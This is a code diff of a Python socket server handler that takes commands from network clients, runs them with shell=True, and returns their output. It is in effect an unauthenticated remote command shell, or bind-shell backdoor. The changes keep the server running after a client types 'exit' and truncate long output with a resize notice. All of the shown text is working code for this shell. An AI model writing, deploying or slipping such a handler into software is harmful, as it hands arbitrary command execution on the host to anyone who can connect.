@@ -6,14 +6,16 @@ class MyServer(socketserver.BaseRequestHandler):
         while True:
             data = self.request.recv(1024).strip()
             if data == b"exit":
-                print("Server Exiting..")
-                server.shutdown()
-                exit(0)
+                print("[~] Connection closed.")
+                break
             else:
                 command = Popen({data}, stdout=PIPE, stderr=PIPE,shell=True)
                 out, err = command.communicate()
                 if out.decode() == "":
                     self.request.send(b"ERROR\n"+err)
+                elif err.decode() == "" and len(out.decode()) > 1024:
+                    max_size = len(out.decode())
+                    self.request.send(b"OK\n[!](RESIZED=%i). Change 'Buffersize' to send all message.\n" %max_size+out[:1024])
                 elif err.decode() == "":
                     self.request.send(b"OK\n"+out)
 
